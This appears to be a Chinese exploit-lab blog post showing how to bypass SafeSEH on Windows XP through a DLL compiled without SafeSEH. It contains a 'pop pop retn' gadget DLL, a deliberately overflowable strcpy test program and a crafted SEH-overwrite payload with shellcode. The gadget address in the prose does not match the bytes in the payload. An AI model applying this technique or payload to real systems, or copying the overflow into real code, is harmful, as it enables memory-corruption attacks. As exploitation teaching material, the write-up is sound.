---
layout:		post
title:		利用未启用SafeS.E.H模块绕过SafeS.E.H
author:		wooy0ung
tags:		
category:  	exploit
---


>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008 & VC 6.0
>调试器: OllyDbg 1.10  
<!-- more -->


### 0x00 前期准备

VC 6.0新建一个dll工程, 贴入以下代码

```
#include "stdafx.h"

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}

void jump()
{
	__asm
	{
		pop eax
		pop eax
		retn
	}
}
```

如下设置好项目属性

![](/assets/img/exploit/2017-10-03-safeseh-break-byunsafe/0x00.png)

关闭优化

![](/assets/img/exploit/2017-10-03-safeseh-break-byunsafe/0x01.png)

直接拖到OD载入, 选择Plugins->SafeSEH->Scan /SafeSEH Modules(需要安装OllySSEH插件), 确认SafeS.E.H没有开启

![](/assets/img/exploit/2017-10-03-safeseh-break-byunsafe/0x02.png)

VS 2008新建一个工程, 帖入以下代码, 选择release版本, 禁止优化

```
#include "stdafx.h"
#include <string.h>
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";

DWORD MyException()
{
	printf("There is an exception");
	getchar();
	return 1;
}

void test(char * input)
{
	char str[200];
	strcpy(str,input);
	int zero=0;

	__try
	{
		zero=1/zero;
	}
	__except(MyException())
	{
	}
}

int main()
{
	HINSTANCE hInst=LoadLibrary(_T("SEH_NoSafeSEH_JUMP.dll"));
	char str[200];

	__asm int 3
	test(shellcode);
	
	return 0;
}
```


### 0x01 分析

运行*.exe, OllyDbg自动附加调试

![](/assets/img/exploit/2017-10-03-safeseh-break-byunsafe/0x03.png)

单步跟进test函数, 直接F4来到这里, 此时完成了strcpy

![](/assets/img/exploit/2017-10-03-safeseh-break-byunsafe/0x04.png)

0x0012fdb8是shellcode的起始栈地址

![](/assets/img/exploit/2017-10-03-safeseh-break-byunsafe/0x05.png)

定位到栈上最近的一个SE Handler(0x0012fe94)

![](/assets/img/exploit/2017-10-03-safeseh-break-byunsafe/0x06.png)


### 0x02 exploit

在dll定位一个"pop pop retn"跳板指令地址(0x111211b6), 注意这个地址不能有两个或以上的'0'连续(如"\x06\x10"也是不行的)

![](/assets/img/exploit/2017-10-03-safeseh-break-byunsafe/0x07.png)

按如下组织shellcode

```
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"		# 220 byte
"\x12\x10\x12\x11"		# pop eax pop eax retn
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"		# shellcode
```

pwn~

![](/assets/img/exploit/2017-10-03-safeseh-break-byunsafe/0x08.png)